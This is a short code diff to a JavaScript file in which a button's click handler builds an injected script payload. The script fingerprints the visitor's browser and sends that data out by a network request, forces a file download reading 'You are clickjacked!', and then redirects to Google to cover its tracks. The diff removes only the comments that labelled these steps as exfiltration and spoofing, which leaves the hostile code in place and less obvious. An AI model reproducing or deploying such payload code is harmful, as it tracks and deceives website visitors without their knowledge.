@@ -4,7 +4,6 @@
 document.getElementById("launch").addEventListener("click", function () {
   const payload = `
     <script>
-      // 1. Fingerprint & exfiltrate
       const data = {
         ua: navigator.userAgent,
         screen: screen.width + 'x' + screen.height,
@@ -18,7 +17,6 @@ document.getElementById("launch").addEventListener("click", function () {
         body: JSON.stringify(data)
       });
 
-      // 2. Trigger forced download
       const a = document.createElement('a');
       a.href = 'data:text/plain;charset=utf-8,You%20are%20clickjacked!';
       a.download = 'win.txt';
@@ -26,7 +24,6 @@ document.getElementById("launch").addEventListener("click", function () {
       document.body.appendChild(a);
       a.click();
 
-      // 3. Spoof back to Google
       setTimeout(() => {
         location.replace('https://www.google.com/');
       }, 1500);
